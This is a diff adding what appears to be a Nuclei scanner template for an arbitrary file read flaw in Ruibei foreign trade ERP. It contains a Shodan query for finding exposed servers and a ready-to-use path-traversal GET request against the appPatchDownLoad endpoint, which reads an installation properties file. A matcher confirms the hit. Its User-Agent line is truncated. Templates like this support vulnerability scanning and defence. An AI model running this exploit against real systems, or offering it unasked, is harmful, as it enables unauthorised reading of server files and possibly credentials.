@@ -1,0 +1,26 @@
+id: Ruibei_foreign_trade_ERP_arbitrary_fileread
+
+info:
+  name: Ruibei_foreign_trade_ERP_arbitrary_fileread
+  author: HK
+  severity: high
+  description: Ruibei foreign trade ERP appPatchDownLoad arbitrary file read
+  metadata:
+    max-request: 1
+    shodan-query: body="loginNeedMobileNumVerification"
+    verified: true
+
+http:
+- raw:
+  - |+
+    GET /appPatchDownLoad?fileName=../../../../RebeeCRM/_RebeeCRM_installation/installvariables.properties HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Macintosh; Intel
+
+  redirects: true
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+      - DESKTOP
